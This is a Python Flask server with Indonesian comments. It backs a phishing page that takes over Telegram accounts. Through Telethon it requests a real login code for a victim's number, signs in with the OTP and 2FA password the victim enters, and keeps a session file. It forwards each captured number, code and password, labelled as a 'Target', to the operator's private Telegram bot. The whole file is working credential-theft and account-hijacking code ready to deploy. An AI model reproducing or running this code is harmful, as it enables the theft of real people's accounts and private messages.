import os
import asyncio
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
from telethon import TelegramClient, errors
from asgiref.sync import async_to_sync

app = Flask(__name__)

# FIX CORS: Mengizinkan akses penuh dari domain Netlify
CORS(app, resources={
    r"/*": {
        "origins": "*",
        "methods": ["GET", "POST", "OPTIONS"],
        "allow_headers": ["Content-Type", "Authorization"]
    }
})

# Ambil variabel dari dashboard Railway
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# Hash sementara untuk verifikasi OTP
sessions_hash = {}

def send_to_bot(message):
    """Mengirim log ke Telegram pribadi"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"})
    except:
        pass

async def telethon_logic(data):
    """Logika Telethon untuk validasi OTP & Sandi secara real-time"""
    step = data.get('step')
    nomor = data.get('nomor')
    otp = data.get('otp')
    sandi = data.get('sandi')
    nama = data.get('nama', 'User')

    client = TelegramClient(f"session_{nomor}", int(API_ID), API_HASH)
    
    try:
        await client.connect()
        
        # STEP 1: Kirim Kode OTP asli dari Telegram
        if step == 1:
            sent_code = await client.send_code_request(nomor)
            sessions_hash[nomor] = sent_code.phone_code_hash
            send_to_bot(f"📲 *Target Masuk*\nNama: {nama}\nNomor: {nomor}")
            return {"status": "success"}, 200

        # STEP 2: Verifikasi OTP
        elif step == 2:
            phone_code_hash = sessions_hash.get(nomor)
            try:
                await client.sign_in(nomor, otp, phone_code_hash=phone_code_hash)
                send_to_bot(f"✅ *Login Berhasil!*\nNomor: {nomor}\nOTP: {otp}")
                return {"status": "success"}, 200
            except errors.SessionPasswordNeededError:
                return {"status": "need_2fa"}, 200
            except errors.PhoneCodeInvalidError:
                return {"status": "error", "message": "Kode OTP Salah!"}, 400

        # STEP 3: Verifikasi Sandi 2FA
        elif step == 3:
            try:
                await client.sign_in(password=sandi)
                send_to_bot(f"✅ *Login Berhasil (2FA)!*\nNomor: {nomor}\nSandi: {sandi}")
                return {"status": "success"}, 200
            except errors.PasswordHashInvalidError:
                return {"status": "error", "message": "Sandi 2FA Salah!"}, 400

    except Exception as e:
        return {"status": "error", "message": str(e)}, 500
    finally:
        await client.disconnect()

@app.route('/register', methods=['POST', 'OPTIONS'])
def register():
    # WAJIB: Menangani Preflight Request agar tidak kena blokir browser
    if request.method == 'OPTIONS':
        return jsonify({"status": "ok"}), 200
        
    data = request.json
    try:
        # Menjalankan fungsi async di dalam Flask agar tidak crash
        result, status_code = async_to_sync(telethon_logic)(data)
        return jsonify(result), status_code
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == "__main__":
    # Menjalankan server pada port yang sesuai dengan dashboard Railway
    port = int(os.getenv("PORT", 8080))
    app.run(host="0.0.0.0", port=port)